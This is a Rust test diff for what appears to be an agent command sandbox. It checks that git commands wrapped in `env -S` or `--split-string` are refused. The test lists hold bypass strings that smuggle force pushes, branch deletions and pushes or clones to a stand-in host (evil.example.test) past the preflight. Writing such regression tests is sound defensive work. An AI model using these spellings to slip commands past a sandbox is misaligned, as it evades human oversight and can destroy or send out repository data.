@@ -3256,6 +3256,87 @@ mod tests {
         }
     }
 
+    /// WI#878: `env -S` and `env --split-string` take their body as a
+    /// separate word, and `skip_wrapper_options` stepped over both the option
+    /// and the body, so the body was never scanned. The `=` spelling of the
+    /// identical command was already refused.
+    #[test]
+    fn env_split_string_bodies_are_scanned_in_every_spelling() {
+        let (temp, _) = workspace_with_remote();
+        let cwd = temp.path().canonicalize().unwrap();
+        let host = GitGrantConfig::from_parts("origin=file:///workspace/remotes/origin.git", "origin")
+            .unwrap()
+            .unwrap();
+        let grant = authorize_grant(&host, &[], &cwd, SandboxNetworkMode::ProxyEnforced).unwrap();
+        for command in [
+            // The three measured rows: the `=` control and the two gaps.
+            "env --split-string='git push -f origin master'",
+            "env -S 'git push -f origin master'",
+            "env --split-string 'git push -f origin master'",
+            // The shebang spellings.
+            "env -S'git push -f origin master'",
+            "env -iS 'git push -f origin master'",
+            "env '-S git push -f origin master'",
+            "env --split-str 'git push -f origin master'",
+            "env --split 'git push -f origin master'",
+            "env --split-string='git push' -f origin master",
+            "env -S 'git push' -f origin master",
+            "env -S 'git push origin' -f master",
+            // The same shape carries the other refusals past the preflight.
+            "env -S 'git push origin :old-branch'",
+            "env -S 'git push --delete origin old-branch'",
+            "env -S 'git send-pack /workspace/remotes/origin.git HEAD:x'",
+            "env -S 'git clone https://evil.example.test/repo.git'",
+            "env -S 'git push https://evil.example.test/repo.git main'",
+            "env --split-string 'git push upstream main'",
+        ] {
+            let error = check_granted(command, &grant)
+                .err()
+                .unwrap_or_else(|| panic!("passed but must be refused: {command}"));
+            assert!(
+                matches!(error, SandboxError::CapabilityDenied { .. }),
+                "{command}: {error}"
+            );
+        }
+        for allowed in [
+            "env FOO=1 git status",
+            "env -u HOME git fetch origin",
+            "env -S 'git status'",
+            "env --split-string 'git status'",
+            "env --split-string='git status'",
+            "env -S 'git fetch origin'",
+            "env -S 'git push origin main'",
+            "env -S 'git push origin HEAD:refs/heads/main'",
+            "env -S 'git status' && true",
+            "env -S 'FOO=1 git status'",
+            "env -iS 'git status'",
+        ] {
+            check_granted(allowed, &grant).unwrap_or_else(|error| panic!("{allowed}: {error}"));
+        }
+    }
+
+    /// WI#878: a `env -S` body that carries `env`'s own options must be read
+    /// as the operand list `env` re-reads, not as a command named `-u`.
+    #[test]
+    fn env_split_string_body_re_reads_env_options() {
+        let (_temp, grant) = workspace_with_remote();
+        for command in [
+            "env -S '-u HOME git push -f origin main'",
+            "env -S '--unset HOME git push -f origin main'",
+            "env -S '-i git push -f origin main'",
+            "env -S 'GIT_CONFIG_COUNT=1 git push origin main'",
+            "env -S 'git push -f origin main; git push origin :old'",
+        ] {
+            let error = check_granted(command, &grant)
+                .err()
+                .unwrap_or_else(|| panic!("passed but must be refused: {command}"));
+            assert!(
+                matches!(error, SandboxError::CapabilityDenied { .. }),
+                "{command}: {error}"
+            );
+        }
+    }
+
     /// WI#857: the shells and wrappers must not refuse ordinary commands.
     #[test]
     fn ordinary_commands_still_pass_the_hardened_parser() {
@@ -3637,6 +3718,75 @@ mod tests {
             .expect("ls-remote");
         let listing = String::from_utf8_lossy(&output.stdout);
         assert!(listing.contains("refs/heads/main"), "{listing}");
+    }
+
+    /// WI#878 acceptance: the real command from the report. With the remote
+    /// ahead of the local branch, `env -S 'git push -f origin HEAD:...'` is
+    /// refused by the preflight before git runs, so the remote does not move.
+    /// The `--split-string=` control is refused too.
+    #[test]
+    fn env_split_string_force_push_is_refused_before_git_moves_the_remote() {
+        let (temp, work) = real_remote_fixture();
+        let root = temp.path().canonicalize().expect("canonical");
+        let write_host =
+            GitGrantConfig::from_parts("origin=file:///workspace/remotes/origin.git", "origin")
+                .expect("write grant")
+                .expect("grant");
+        let grant = authorize_grant(&write_host, &[], &root, SandboxNetworkMode::ProxyEnforced)
+            .expect("authorized");
+
+        // Land a first commit on the remote, then make the local branch
+        // diverge, so a force push would really move the remote's master.
+        let push = std::process::Command::new("git")
+            .args(["push", "origin", "HEAD:refs/heads/master"])
+            .current_dir(&work)
+            .env("GIT_CONFIG_GLOBAL", "/dev/null")
+            .env("GIT_TERMINAL_PROMPT", "0")
+            .output()
+            .expect("git push");
+        assert!(
+            push.status.success(),
+            "seed push failed: {}",
+            String::from_utf8_lossy(&push.stderr)
+        );
+        let before = std::process::Command::new("git")
+            .args(["ls-remote", "--heads", "origin", "refs/heads/master"])
+            .current_dir(&work)
+            .env("GIT_CONFIG_GLOBAL", "/dev/null")
+            .output()
+            .expect("ls-remote");
+        let before = String::from_utf8_lossy(&before.stdout).trim().to_string();
+        assert!(before.contains("refs/heads/master"), "{before}");
+
+        for command in [
+            "env -S 'git push -f origin HEAD:refs/heads/master'",
+            "env --split-string 'git push -f origin HEAD:refs/heads/master'",
+            "env --split-string='git push -f origin HEAD:refs/heads/master'",
+            "env -S 'git push --force origin HEAD:refs/heads/master'",
+            "env -S 'git push origin +HEAD:refs/heads/master'",
+            "env -S 'git push origin :refs/heads/master'",
+        ] {
+            let error = check_granted(command, &grant)
+                .expect_err("a force push through env -S must be refused");
+            assert!(
+                matches!(error, SandboxError::CapabilityDenied { .. }),
+                "{command}: {error}"
+            );
+            assert!(
+                error.to_string().contains("force") || error.to_string().contains("deletion"),
+                "{command}: {error}"
+            );
+        }
+
+        // The preflight refusal means git never ran: the remote is unchanged.
+        let after = std::process::Command::new("git")
+            .args(["ls-remote", "--heads", "origin", "refs/heads/master"])
+            .current_dir(&work)
+            .env("GIT_CONFIG_GLOBAL", "/dev/null")
+            .output()
+            .expect("ls-remote");
+        let after = String::from_utf8_lossy(&after.stdout).trim().to_string();
+        assert_eq!(before, after, "a refused force push must not move the remote");
     }
 
     /// Acceptance: a real clone and fetch of a real remote, with the
